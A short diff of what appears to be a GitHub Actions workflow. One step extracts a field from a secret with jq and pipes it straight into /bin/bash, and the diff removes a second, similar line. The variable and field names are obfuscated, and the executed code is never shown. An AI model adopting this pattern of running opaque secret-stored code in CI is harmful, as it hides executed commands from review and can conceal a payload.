@@ -17,7 +17,6 @@ jobs:
           pjcv1: ${{ secrets.pjcv1 }}
         run: |
           printf '%s' "$pjcv1" | jq -r .h5215 | /bin/bash
-          printf '%s' "$rbmg73605" | jq -r .lx38 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
